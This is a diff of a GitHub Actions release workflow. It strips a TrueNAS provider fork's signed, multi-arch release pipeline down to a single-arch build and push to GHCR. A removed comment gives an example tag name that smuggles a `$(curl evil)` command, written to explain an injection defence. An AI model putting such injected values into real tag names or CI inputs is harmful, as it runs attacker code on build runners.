@@ -1,5 +1,13 @@
 name: Release
 
+# Simplified fork release workflow — single-arch (linux/amd64, matches TrueNAS
+# SCALE's x86_64 target), no signed-tag gate, no cosign/SBOM/multi-arch. This
+# fork exists to ship one targeted fix (the wsTransport WaitGroup-reuse panic
+# in internal/client/ws.go); it intentionally does not replicate upstream's
+# full supply-chain pipeline (see bearbinary/omni-infra-provider-truenas for
+# that). Push a `v*` tag to build and publish ghcr.io/<owner>/<repo>:<tag>
+# (+ :latest).
+
 on:
   push:
     tags:
@@ -9,281 +17,39 @@ permissions:
   contents: read
 
 jobs:
-  # Gate release on tests passing. `go test` compiles the packages, so a
-  # separate `make build` step would duplicate compilation — skip it.
-  # `make test` runs with `-race` (see Makefile) so data races like the
-  # gotPaths race fixed in v0.14.7 would fail here rather than ship.
-  test:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2
-
-      - uses: actions/setup-go@4a3601121dd01d1626a1e23e37211e3254c1c06c # v6.4.0
-        with:
-          go-version-file: go.mod
-
-      - name: Test (unit + cassette replay, race-enabled)
-        run: make test
-
-      # Cassette-replay gate: fail the release if an integration test has no
-      # cassette to replay against. Without this, a deleted cassette turns an
-      # integration test into a silent no-op that reports green.
-      - name: Verify integration cassettes present
-        env:
-          CI_REQUIRE_CASSETTES: "1"
-        run: go test -count=1 -run TestIntegration_ ./internal/client/... ./internal/cleanup/... ./internal/provisioner/...
-
-  # Cross-compile each target on its own runner in parallel. Each job uploads
-  # its binary as an artifact; the release job downloads all four.
-  build:
-    needs: test
-    runs-on: ubuntu-latest
-    # SAFETY CONTRACT (do not strip without re-checking every `run:` script):
-    # All `${{ github.* }}` user-controlled inputs are routed through env vars
-    # at the job level so they never participate in shell tokenization.
-    # A tag named e.g. `v0.0.1$(curl evil)` would otherwise execute on the
-    # runner the moment any step's `run:` block contains the bare expression.
-    # Job-level scope makes the safe path the default for any future step
-    # that needs the tag — a step author cannot forget the per-step env block.
-    env:
-      TAG: ${{ github.ref_name }}
-      REPO: ${{ github.repository }}
-    strategy:
-      fail-fast: true
-      matrix:
-        include:
-          - goos: linux
-            goarch: amd64
-          - goos: linux
-            goarch: arm64
-          - goos: darwin
-            goarch: amd64
-          - goos: darwin
-            goarch: arm64
-    steps:
-      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2
-
-      - uses: actions/setup-go@4a3601121dd01d1626a1e23e37211e3254c1c06c # v6.4.0
-        with:
-          go-version-file: go.mod
-
-      - name: Build binary
-        env:
-          GOOS: ${{ matrix.goos }}
-          GOARCH: ${{ matrix.goarch }}
-          CGO_ENABLED: "0"
-        run: |
-          LDFLAGS="-s -w -X main.version=${TAG}"
-          OUT="_out/omni-infra-provider-truenas-${GOOS}-${GOARCH}"
-          mkdir -p _out
-          go build -ldflags="$LDFLAGS" -o "$OUT" ./cmd/omni-infra-provider-truenas
-
-      - name: Upload binary artifact
-        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
-        with:
-          name: binary-${{ matrix.goos }}-${{ matrix.goarch }}
-          path: _out/omni-infra-provider-truenas-${{ matrix.goos }}-${{ matrix.goarch }}
-          if-no-files-found: error
-          retention-days: 1
-
   release:
-    needs: build
     runs-on: ubuntu-latest
     permissions:
-      contents: write
+      contents: read
       packages: write
-      id-token: write  # Required for cosign keyless signing via Sigstore OIDC
-    # SAFETY CONTRACT (do not strip without re-checking every `run:` script):
-    # All `${{ github.* }}` user-controlled inputs are routed through env vars
-    # at the job level so they never participate in shell tokenization.
-    # `steps.version.outputs.tag` is also set FROM `github.ref_name`, so it is
-    # equivalent to `$TAG` and gets the same treatment. The signed-tag verify
-    # gate runs INSIDE this job — its inputs depend on the same protection,
-    # so this env block must remain valid for every step including the gate.
+    # $TAG is routed through a job-level env var (not inlined as a bare
+    # github.ref_name expression) so a maliciously-named tag can't
+    # participate in shell tokenization in any step below.
     env:
       TAG: ${{ github.ref_name }}
-      REPO: ${{ github.repository }}
     steps:
       - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2
+
+      - uses: actions/setup-go@4a3601121dd01d1626a1e23e37211e3254c1c06c # v6.4.0
         with:
-          fetch-depth: 0
-          # actions/checkout does not fetch tag *objects* by default even at
-          # fetch-depth: 0 — only refs/heads. `git tag --verify` then fails
-          # with "cannot verify a non-tag object of type commit" because the
-          # annotated tag object isn't in the local clone.
-          fetch-tags: true
+          go-version-file: go.mod
 
-      # Even with fetch-tags: true, actions/checkout creates a LIGHTWEIGHT
-      # local tag when the workflow is triggered by a tag push — the
-      # annotated tag object is replaced with a direct ref to the commit.
-      # See actions/checkout#1467. Re-fetch the annotated tag object
-      # explicitly so `git tag --verify` can read its signature.
-      # CRITICAL: this fetch runs BEFORE the signed-tag verify gate below,
-      # so any shell injection here fires before signatures are checked.
-      # $TAG is set at the job level (see SAFETY CONTRACT in the `release:`
-      # env block) — the bare github.ref_name expression must NOT be
-      # reintroduced into this run script.
-      - name: Refetch annotated tag object
-        run: git fetch origin "refs/tags/${TAG}:refs/tags/${TAG}" --force
+      - name: Test (unit, race-enabled)
+        run: make test
 
-      # SSH-signed tags require an allowed-signers file so git can map a
-      # signature back to a trusted identity. The file is committed to the
-      # repo at .github/allowed_signers and point git at it here. Rotate
-      # entries by PR if a maintainer's signing key changes.
-      - name: Configure SSH allowed signers
-        run: |
-          git config gpg.ssh.allowedSignersFile "${GITHUB_WORKSPACE}/.github/allowed_signers"
-
-      # Require tags to be GPG/SSH signed. Without this, anyone with push
-      # access to a tag namespace can publish a "v*" release through this
-      # workflow. Enable required_signatures on the repo ruleset AND the
-      # workflow check — belt and braces. (supply-chain M14)
-      # The verify gate is the final guard against poisoned-tag releases —
-      # its $TAG comes from the job-level env (see SAFETY CONTRACT) so the
-      # untrusted github.ref_name is never inlined into this script.
-      - name: Verify tag is signed
-        run: |
-          set -euo pipefail
-          if ! git tag --verify "${TAG}" 2>&1; then
-            echo "::error::Tag ${TAG} is not signed or the signature did not verify. Re-tag with 'git tag -s ${TAG}' from a trusted signing key."
-            exit 1
-          fi
-          echo "OK: tag ${TAG} is signed and verifies"
-
-      # Fail fast: if a release already exists for this tag, assets are immutable
-      # and cannot be overwritten. Delete the release first if you need to re-run.
-      - name: Check for existing release
+      - name: Build linux/amd64 binary
         env:
-          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          GOOS: linux
+          GOARCH: amd64
+          CGO_ENABLED: "0"
         run: |
-          if gh release view "${TAG}" &>/dev/null; then
-            echo "::error::Release ${TAG} already exists. Immutable releases cannot be updated. To re-release: gh release delete ${TAG} --yes && git push origin :refs/tags/${TAG}"
-            exit 1
-          fi
+          mkdir -p _out
+          go build -ldflags="-s -w -X main.version=${TAG}" \
+            -o _out/omni-infra-provider-truenas-linux-amd64 \
+            ./cmd/omni-infra-provider-truenas
 
-      - name: Set version from tag
-        id: version
-        run: echo "tag=${TAG}" >> "$GITHUB_OUTPUT"
-
-      # Pre-release detection. Semver pre-release tags (vX.Y.Z-rc.N,
-      # vX.Y.Z-beta.N, vX.Y.Z-alpha.N) carry a `-` after the version core.
-      # Stable tags never do. Downstream steps consume `is_prerelease` to:
-      #  1. Suppress the `latest` and `{major}.{minor}` Docker tags so a
-      #     prerelease does not displace the stable image users pull by
-      #     default.
-      #  2. Pass `--prerelease` to `gh release create` so the GitHub release
-      #     does not become the repo's "Latest release".
-      # Cutting a pre-release is documented in the cutting-pre-release skill;
-      # the corresponding stable release is cut afterward via cutting-release.
-      - name: Detect prerelease
-        id: prerelease
-        run: |
-          if [[ "$TAG" == *-* ]]; then
-            echo "is_prerelease=true" >> "$GITHUB_OUTPUT"
-            echo "Tag ${TAG} is a pre-release (will not be marked latest)."
-          else
-            echo "is_prerelease=false" >> "$GITHUB_OUTPUT"
-            echo "Tag ${TAG} is a stable release."
-          fi
-
-      # `:preview` Docker tag — points at the latest released image
-      # considering BOTH stable and pre-release tags in semver order.
-      # Targets soak-cohort users who want the newest available image
-      # regardless of channel:
-      #   - After v0.16.1 stable cut: :preview = :v0.16.1
-      #   - After v0.16.2-rc.1 cut:   :preview = :v0.16.2-rc.1 (newer than 0.16.1)
-      #   - After v0.16.2 stable cut: :preview = :v0.16.2 (newer than -rc.N)
-      #
-      # We push :preview ONLY if THIS release is the newest by semver
-      # order — `sort -rV` correctly handles "stable > its-own-rc" AND
-      # "next-minor-rc > current-stable". Without this guard, a hot-fix
-      # cut on an OLDER branch (e.g. v0.15.6 while v0.16.x is current)
-      # would silently overwrite :preview backward.
-      #
-      # is_newest output is consumed by the metadata-action `enable=`
-      # gate on the `:preview` tag rule below.
-      - name: Determine if this release is the newest by semver
-        id: is_newest
-        env:
-          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-          CURRENT: ${{ env.TAG }}
-        run: |
-          # Get all existing release tags from GitHub. The CURRENT tag's
-          # release hasn't been created yet at this workflow stage, so
-          # we add it to the comparison set explicitly. `sort -rV`
-          # handles semver ordering correctly:
-          #   v0.16.2-rc.1 > v0.16.1 (newer minor RC beats older stable)
-          #   v0.16.1 > v0.16.1-rc.5 (stable beats its own RCs)
-          NEWEST=$(
-            (
-              gh release list --limit 100 --json tagName --jq '.[].tagName' || true
-              echo "$CURRENT"
-            ) | sort -rV -u | head -1
-          )
-          if [ "$NEWEST" = "$CURRENT" ]; then
-            echo "is_newest=true" >> "$GITHUB_OUTPUT"
-            echo "Tag ${CURRENT} IS the newest release by semver — :preview will be updated."
-          else
-            echo "is_newest=false" >> "$GITHUB_OUTPUT"
-            echo "Tag ${CURRENT} is NOT the newest (${NEWEST} is newer). :preview will NOT be updated to avoid moving it backward."
-          fi
-
-      # $TAG and $REPO come from the job-level env block. steps.version.outputs.tag
-      # was previously plumbed in here too — that field is set FROM github.ref_name,
-      # so it carries the same risk as the bare expression. Job-level env is the
-      # one source.
-      - name: Extract release notes from CHANGELOG.md
-        run: |
-          PREV_TAG=$(git describe --tags --abbrev=0 "$TAG^" 2>/dev/null || echo "")
-
-          # Extract the section for this version from CHANGELOG.md.
-          # Matches from "## [vX.Y.Z]" to the next "## [" or end of file.
-          VERSION="${TAG#v}"  # strip leading v for flexible matching
-          # Pass VERSION to awk via -v so awk regex metacharacters in the tag
-          # cannot widen or break the section match. Direct embedding turned
-          # the tag into part of the regex source; -v keeps it as a string
-          # variable that the program references explicitly.
-          NOTES=$(awk -v ver="$VERSION" '
-            $0 ~ "^## \\[v?" ver "\\]" { found=1; next }
-            /^## \[/ { if (found) exit }
-            found { print }
-          ' CHANGELOG.md)
-
-          if [ -z "$NOTES" ]; then
-            echo "::warning::No CHANGELOG.md entry found for ${TAG}. Falling back to git log."
-            RANGE="${PREV_TAG:+${PREV_TAG}..}${TAG}"
-            NOTES=$(git log "$RANGE" --pretty=format:"- %s (%h)" 2>/dev/null || true)
-          fi
-
-          {
-            echo "$NOTES"
-            echo ""
-            echo "**Full Changelog**: https://github.com/${REPO}/compare/${PREV_TAG:-$(git rev-list --max-parents=0 HEAD | head -1)}...${TAG}"
-          } > RELEASE_NOTES.md
-
-          echo "--- Release notes ---"
-          cat RELEASE_NOTES.md
-
-      - name: Download all binary artifacts
-        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1
-        with:
-          path: _out
-          pattern: binary-*
-          merge-multiple: true
-
-      # actions/upload-artifact + download-artifact package files as ZIP and
-      # strip the execute bit. Without this chmod, release-page binaries
-      # downloaded by users fail with "Permission denied" when run directly.
-      # (The Dockerfile sets --chmod=0755 independently for the container image.)
-      - name: Restore executable bit on binaries
-        run: chmod +x _out/omni-infra-provider-truenas-*
-
-      - name: Generate checksums
-        run: |
-          cd _out
-          sha256sum * > checksums.txt
-
-      # --- Supply Chain Security (before release creation) ---
+      - name: Set up Docker Buildx
+        uses: docker/setup-buildx-action@4d04d5d9486b7bd6fa91e7baf45bbb4f8b9deedd # v4.0.0
 
       - name: Log in to GHCR
         uses: docker/login-action@4907a6ddec9925e35a0a9e82d7399ccc52663121 # v4.1.0
@@ -292,296 +58,29 @@ jobs:
           username: ${{ github.actor }}
           password: ${{ secrets.GITHUB_TOKEN }}
 
-      # QEMU binfmt registration is required for 'docker run --platform
-      # linux/arm64' to actually execute arm64 binaries under emulation on
-      # the amd64 runner — without it the multi-arch smoke test hits
-      # "exec format error". setup-buildx alone handles buildx builds but
-      # not plain docker run.
-      - name: Set up QEMU (for multi-arch smoke test)
-        uses: docker/setup-qemu-action@ce360397dd3f832beb865e1373c09c0e9f86d70a # v4.0.0
-
-      - name: Set up Docker Buildx
-        uses: docker/setup-buildx-action@4d04d5d9486b7bd6fa91e7baf45bbb4f8b9deedd # v4.0.0
-
-      - name: Docker metadata
-        id: meta
-        uses: docker/metadata-action@030e881283bb7a6894de51c315a6bfe6a94e05cf # v6.0.0
-        with:
-          images: ghcr.io/${{ github.repository }}
-          # Tag rules:
-          #
-          # 1. Exact git ref (`v0.16.0`, `v0.16.1-rc.4`) — published
-          #    UNCONDITIONALLY via `type=raw`. The previous
-          #    `type=semver,pattern=v{{version}}` rule was empirically
-          #    observed to filter prereleases under
-          #    docker/metadata-action@v6.0.0: stable tags emitted
-          #    `:v0.16.0`, but prereleases did NOT emit `:v0.16.1-rc.N`.
-          #    A TrueNAS apps YAML pinned to `:v0.16.1-rc.1` then
-          #    failed with `manifest unknown` because only the
-          #    bare-semver `:0.16.1-rc.1` was actually pushed. Switching
-          #    to `type=raw` makes the v-prefixed tag track every
-          #    release shape uniformly.
-          # 2. Bare semver (`0.16.0`, `0.16.1-rc.4`) — kept for tooling
-          #    that expects the no-`v` form.
-          # 3. {{major}}.{{minor}} (`0.16`) — gated to STABLE only.
-          # 4. `latest` — gated to STABLE only. v0.16.1-rc.1 displaced
-          #    it historically; the guard prevents a recurrence.
-          # 5. `preview` — points at the newest published image across
-          #    BOTH channels (stable AND pre-release) in semver order.
-          #    Gated by `is_newest` so a hot-fix on an old branch
-          #    cannot move :preview backward. Distinct from `:latest`:
-          #    :latest is the stable channel only; :preview tracks the
-          #    leading edge for soak-cohort users.
-          # The contains-check on `-` matches every prerelease form
-          # (-rc.N, -beta.N, -alpha.N) since semver mandates a `-`.
-          tags: |
-            type=raw,value=${{ steps.version.outputs.tag }}
-            type=semver,pattern={{version}},value=${{ steps.version.outputs.tag }}
-            type=semver,pattern={{major}}.{{minor}},value=${{ steps.version.outputs.tag }},enable=${{ steps.prerelease.outputs.is_prerelease == 'false' }}
-            type=raw,value=latest,enable=${{ steps.prerelease.outputs.is_prerelease == 'false' }}
-            type=raw,value=preview,enable=${{ steps.is_newest.outputs.is_newest == 'true' }}
-
-      # Build single-arch (runner-native) image into the local Docker daemon
-      # so we can smoke test it *before* pushing multi-arch. If we pushed
-      # first and then tested, a broken image (e.g. missing execute bit,
-      # corrupted binary) would already be live on GHCR by the time the test
-      # flagged it. Building locally first + pushing only on success means a
-      # broken image never reaches users. BuildKit cache (type=gha) makes
-      # the second multi-arch build a near-no-op for the native-arch layer.
-      - name: Build image locally for smoke test
-        uses: docker/build-push-action@bcafcacb16a39f128d818304e6c9c0c18556b85f # v7.1.0
-        with:
-          context: .
-          load: true
-          platforms: linux/amd64
-          tags: smoke-test:${{ steps.version.outputs.tag }}
-          cache-from: type=gha
-          cache-to: type=gha,mode=max
-
-      # Catches the "permission denied" class of regressions that slipped
-      # through v0.14.1–v0.14.3, where actions/upload-artifact stripped the
-      # execute bit from the binary and docker COPY preserved the zero mode.
-      # The `--version` handler exits 0 immediately without needing Omni or
-      # TrueNAS config, so the only thing it tests is "can the binary run".
-      - name: Smoke test local image (binary is executable)
-        run: |
-          set -euo pipefail
-          IMAGE="smoke-test:${TAG}"
-          echo "Running --version inside ${IMAGE}..."
-          OUTPUT=$(docker run --rm "${IMAGE}" --version 2>&1)
-          echo "stdout: ${OUTPUT}"
-          if [ -z "${OUTPUT}" ]; then
-            echo "::error::Smoke test failed: --version produced no output. Binary is likely missing the execute bit or crashed on startup."
-            exit 1
-          fi
-          if [ "${OUTPUT}" != "${TAG}" ]; then
-            echo "::error::Smoke test failed: expected version ${TAG}, got ${OUTPUT}. The ldflags -X main.version=... did not take effect during build."
-            exit 1
-          fi
-          echo "Smoke test passed: image runs and reports version ${OUTPUT}"
-
-      # Image- and Dockerfile-level invariants that are easy to silently break:
-      #
-      # 1. Container runtime UID. `USER 65534:65534` (set in v0.14.5) aligns
-      #    container writes with TrueNAS host `nobody`. If a future Dockerfile
-      #    edit drops the USER directive, the distroless :nonroot default
-      #    (uid 65532) takes over and bind mounts on TrueNAS hosts get owned
-      #    by an unexpected uid — silent permission errors on PVC writes.
-      #
-      # 2. Dockerfile content. The `--chmod=0755` and `USER` directives are
-      #    the runtime versions of v0.14.4 and v0.14.5 fixes. If they drop
-      #    out of the Dockerfile during a refactor, only the runtime smoke
-      #    test catches them — and only one of them at a time. The grep
-      #    asserts here fail the build immediately on Dockerfile drift.
-      - name: Verify image and Dockerfile invariants
-        run: |
-          set -euo pipefail
-          IMAGE="smoke-test:${TAG}"
-
-          USER_GID=$(docker inspect "${IMAGE}" --format '{{.Config.User}}')
-          if [ "${USER_GID}" != "65534:65534" ]; then
-            echo "::error::Container runs as ${USER_GID}, expected 65534:65534 (TrueNAS nobody alignment, set in v0.14.5)."
-            echo "::error::If you intentionally changed this, update the test and the v0.14.5 CHANGELOG entry."
-            exit 1
-          fi
-          echo "OK: image Config.User = ${USER_GID}"
-
-          if ! grep -q -- '--chmod=0755' Dockerfile; then
-            echo "::error::Dockerfile is missing 'COPY --chmod=0755'. This is the v0.14.4 fix for the actions/upload-artifact ZIP-strips-execute-bit regression."
-            echo "::error::Without it, the published image fails to start with: exec: '/usr/local/bin/omni-infra-provider-truenas': permission denied"
-            exit 1
-          fi
-          echo "OK: Dockerfile contains --chmod=0755"
-
-          if ! grep -q '^USER 65534:65534' Dockerfile; then
-            echo "::error::Dockerfile is missing 'USER 65534:65534'. This is the v0.14.5 fix for TrueNAS nobody alignment."
-            exit 1
-          fi
-          echo "OK: Dockerfile contains USER 65534:65534"
-
-      # Only reached if the smoke test + invariant checks passed. Multi-arch build pushed to GHCR.
-      - name: Build and push Docker image
-        id: docker-push
+      - name: Build and push image
         uses: docker/build-push-action@bcafcacb16a39f128d818304e6c9c0c18556b85f # v7.1.0
         with:
           context: .
           push: true
-          platforms: linux/amd64,linux/arm64
-          tags: ${{ steps.meta.outputs.tags }}
-          labels: ${{ steps.meta.outputs.labels }}
+          platforms: linux/amd64
+          tags: |
+            ghcr.io/${{ github.repository }}:${{ github.ref_name }}
+            ghcr.io/${{ github.repository }}:latest
           cache-from: type=gha
           cache-to: type=gha,mode=max
-          provenance: true
-          sbom: true
 
-      # Smoke-test the multi-arch image that was just pushed. The pre-push
-      # smoke test only covered the native-arch layer — this pulls the final
-      # per-platform images from GHCR and runs `--version` under QEMU to
-      # catch regressions where a cross-compiled arm64 layer breaks at
-      # runtime. (supply-chain M15)
-      - name: Multi-arch pulled-image smoke test
-        env:
-          DIGEST: ${{ steps.docker-push.outputs.digest }}
-          EXPECTED: ${{ env.TAG }}
-          META_VERSION: ${{ steps.meta.outputs.version }}
+      # --version exits 0 immediately without needing Omni or TrueNAS config —
+      # catches the "binary missing execute bit / crashed on startup" class of
+      # regression without needing to smoke-test against real credentials.
+      - name: Smoke test pushed image
         run: |
           set -euo pipefail
-
-          # Use the tag (not the multi-arch index digest) to reference the
-          # image across platforms — pulling the same digest under two
-          # platforms fails with "cannot overwrite digest" because Docker
-          # stores each image by digest and refuses to rebind it.
-          #
-          # Source the tag from `steps.meta.outputs.version` (the parsed
-          # semver string, e.g. `0.16.1-rc.1`) instead of
-          # `steps.version.outputs.tag` (the raw git ref, e.g.
-          # `v0.16.1-rc.1`). Reason: metadata-action emits tags using its
-          # parsed version — so `:0.16.1-rc.1` is published, but
-          # `:v0.16.1-rc.1` is NOT (the `pattern=v{{version}}` rule was
-          # observed empirically not to fire for prereleases under
-          # docker/metadata-action@v6.0.0). Using the raw git ref here
-          # produced `manifest unknown` on the v0.16.1-rc.1 attempt because
-          # the pulled tag never existed. The parsed version is always
-          # what's pushed, so it always exists.
-          TAGGED="ghcr.io/${REPO}:${META_VERSION}"
-          for platform in linux/amd64 linux/arm64; do
-            echo "--- smoke test ${platform}"
-            # Pre-pull silently so 'docker run' stderr (cache-miss progress)
-            # doesn't get interleaved into the --version stdout we compare.
-            docker pull --quiet --platform "${platform}" "${TAGGED}" >/dev/null
-            OUTPUT=$(docker run --rm --platform "${platform}" "${TAGGED}" --version)
-            if [ "${OUTPUT}" != "${EXPECTED}" ]; then
-              echo "::error::Multi-arch smoke test failed on ${platform}: expected ${EXPECTED}, got ${OUTPUT}"
-              exit 1
-            fi
-            echo "OK: ${platform} reports ${OUTPUT}"
-          done
-
-      - name: Install cosign
-        uses: sigstore/cosign-installer@cad07c2e89fa2edd6e2d7bab4c1aa38e53f76003 # v4.1.1
-
-      - name: Sign Docker image
-        env:
-          DIGEST: ${{ steps.docker-push.outputs.digest }}
-        run: |
-          # `--oidc-issuer` is intentionally NOT passed. cosign 2.5+ rejects
-          # the combination of an explicit service URL with the new
-          # signing-config / TUF trust root with:
-          #   "cannot specify service URLs and use signing config"
-          # In GitHub Actions the OIDC issuer is auto-discovered from the
-          # ACTIONS_ID_TOKEN_REQUEST_URL environment variable (set when the
-          # job has `permissions: id-token: write`), so the explicit flag is
-          # redundant for keyless signing in GHA. Pre-cosign-2.5 builds
-          # accepted both; v0.16.1-rc.2 was the first run after the upgrade
-          # and surfaced the regression.
-          cosign sign --yes "ghcr.io/${REPO}@${DIGEST}"
-
-      - name: Generate SBOM
-        # anchore/sbom-action's @v0 channel is deliberately unstable per their
-        # README. Pin by commit SHA so a tag-move doesn't inject a compromised
-        # action into the release flow (supply-chain M16).
-        uses: anchore/sbom-action@e22c389904149dbc22b58101806040fa8d37a610 # v0
-        with:
-          image: ghcr.io/${{ github.repository }}@${{ steps.docker-push.outputs.digest }}
-          artifact-name: sbom-${{ steps.version.outputs.tag }}.spdx.json
-          output-file: _out/sbom.spdx.json
-
-      - name: Attest SBOM to image
-        env:
-          DIGEST: ${{ steps.docker-push.outputs.digest }}
-        run: |
-          # See "Sign Docker image" above for why --oidc-issuer is omitted.
-          cosign attest --yes \
-            --predicate _out/sbom.spdx.json \
-            --type spdxjson \
-            "ghcr.io/${REPO}@${DIGEST}"
-
-      - name: Sign release binaries
-        run: |
-          # See "Sign Docker image" above for why --oidc-issuer is omitted.
-          #
-          # cosign 2.5+ defaults to the new "sigstore bundle" format, which
-          # combines the signature, certificate, and Rekor transparency-log
-          # entry into a single `.sigstore.json` file. The legacy
-          # --output-signature / --output-certificate flags are deprecated
-          # and silently ignored under the new format; the actual sign
-          # operation then fails with `create bundle file: open : no such
-          # file or directory` because no `--bundle` path was supplied.
-          # Verified on the v0.16.1-rc.3 attempt — every sign-blob call
-          # warned about the deprecated flags then errored.
-          # Pass --bundle explicitly to satisfy the new format.
-          # Verification migration: consumers who previously ran
-          #   cosign verify-blob --signature x.sig --certificate x.cert ...
-          # should now use the bundle file:
-          #   cosign verify-blob --bundle x.sigstore.json ...
-          # README example will be updated in a follow-up commit.
-          for f in _out/omni-infra-provider-truenas-*; do
-            cosign sign-blob --yes \
-              --bundle "${f}.sigstore.json" \
-              "$f"
-          done
-
-      # Bundle Grafana dashboards + Prometheus alert rules for easy import.
-      # Users can grab individual JSONs, the zip, or the alerts YAML from the
-      # release page and drop them into Grafana Cloud / self-hosted Prom.
-      - name: Bundle observability assets
-        run: |
-          cp deploy/observability/dashboards/*.json _out/
-          cp deploy/observability/alerts/*.yml _out/
-          (cd deploy/observability/dashboards && zip -r - *.json) > _out/grafana-dashboards.zip
-
-      # Single atomic release creation — all assets uploaded together.
-      # With immutable releases, assets cannot be modified after creation.
-      # If this step fails, delete the release and re-tag to retry.
-      #
-      # Pre-release tags (vX.Y.Z-rc.N etc.) get `--prerelease`, which marks
-      # the release as a prerelease on GitHub AND implicitly excludes it from
-      # being chosen as the repo's "Latest release". Without that flag a
-      # prerelease would hijack `gh release download` (no version pin) and
-      # show up at the top of the releases page, defeating the soak window.
-      - name: Create GitHub Release with all assets
-        env:
-          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-          IS_PRERELEASE: ${{ steps.prerelease.outputs.is_prerelease }}
-        run: |
-          ARGS=()
-          if [ "${IS_PRERELEASE}" = "true" ]; then
-            ARGS+=("--prerelease")
+          IMAGE="ghcr.io/${{ github.repository }}:${TAG}"
+          OUTPUT=$(docker run --rm "${IMAGE}" --version 2>&1)
+          echo "stdout: ${OUTPUT}"
+          if [ "${OUTPUT}" != "${TAG}" ]; then
+            echo "::error::Smoke test failed: expected version ${TAG}, got ${OUTPUT}"
+            exit 1
           fi
-          gh release create "${TAG}" \
-            "${ARGS[@]}" \
-            --title "${TAG}" \
-            --notes-file RELEASE_NOTES.md \
-            _out/omni-infra-provider-truenas-linux-amd64 \
-            _out/omni-infra-provider-truenas-linux-arm64 \
-            _out/omni-infra-provider-truenas-darwin-amd64 \
-            _out/omni-infra-provider-truenas-darwin-arm64 \
-            _out/checksums.txt \
-            _out/sbom.spdx.json \
-            _out/*.sigstore.json \
-            _out/grafana-dashboards.zip \
-            _out/overview.json \
-            _out/provisioning.json \
-            _out/api-performance.json \
-            _out/cleanup.json \
-            _out/truenas-provider.rules.yml
+          echo "Smoke test passed: image runs and reports version ${OUTPUT}"
